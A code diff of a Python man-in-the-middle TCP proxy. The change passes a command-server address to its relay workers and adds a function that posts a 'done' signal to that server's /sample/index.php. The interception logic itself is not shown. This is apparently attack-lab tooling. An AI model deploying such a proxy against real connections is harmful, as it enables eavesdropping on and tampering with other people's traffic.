@@ -7,6 +7,8 @@ import threading
 import signal
 import sys
 import http.client
+import requests as req
+import json
 from contextlib import contextmanager
 
 running = True
@@ -17,7 +19,7 @@ SERVER2CLIENT = 2
 REQUESTCOUNTER = 0
 PACKAGEHOLDER = None
 
-def mitm(buff, direction):
+def mitm(buff, direction, command_server_ip, command_server_port):
   hb = buff
   if direction == CLIENT2SERVER:
     global REQUESTCOUNTER
@@ -51,7 +53,7 @@ def killp(a, b):
     b.close()
   return
 
-def worker(client, server, n):
+def worker(client, server, n, command_server_ip, command_server_port):
   while running == True:
     b = ""
     with ignored(Exception):
@@ -60,7 +62,7 @@ def worker(client, server, n):
       killpn(client,server,n)
       return
     try:
-      b = mitm(b,n)
+      b = mitm(b,n, command_server_ip, command_server_port)
     except:
       pass
     try:
@@ -75,15 +77,18 @@ def worker(client, server, n):
 def signalhandler(sn, sf):
   running = False
 
-def sendPostCloseRequest():
-  connection = http.client.HTTPSConnection(COMMANDSERVER,COMMANDPORT,timeout=10)
-  payload = '{\"type\": \"done\"}'
-  headers = {'Content-type': 'application/json'}
-  json_data = json.dumps(payload)
-  connection.request('POST', 'REQUEST', json_data, headers)
-  response = conn.getresponse()
+def getDoneCommand():
+    command = {"type": "done"}
+    return json.dumps(command)
 
-def doProxyMain(port, remotehost, remoteport):
+def sendDoneSignal(command_server_ip,command_server_port):
+    print("Done sent!")
+    payload = {'REQUEST':getDoneCommand()}
+    headers = {'Content-Type' : 'application/x-www-form-urlencoded','Accept':'*/*'}
+    r = req.post("http://"+command_server_ip+":"+str(command_server_port)+"/sample/index.php", data = payload, headers = headers)
+    print(r.text)
+
+def doProxyMain(port, remotehost, remoteport, command_server_ip, command_server_port):
   signal.signal(signal.SIGTERM, signalhandler)
   try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -95,12 +100,13 @@ def doProxyMain(port, remotehost, remoteport):
       k,a = s.accept()
       v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       v.connect((remotehost, remoteport))
-      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
-      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT))
+      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER, command_server_ip, command_server_port))
+      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT, command_server_ip, command_server_port))
       t2.start()
       t1.start()
       workers.append((t1,t2,k,v))
   except KeyboardInterrupt:
+    signalhandler(None, None)
     signalhandler(None, None)
   for t1,t2,k,v in workers:
     killp(k,v)
@@ -118,4 +124,4 @@ if __name__ == '__main__':
   args = parser.parse_args()
   print('started\n')
   sys.stdout.flush()
-  doProxyMain(args.p, args.s, args.q)
+  doProxyMain(args.p, args.s, args.q, args.c, args.d)
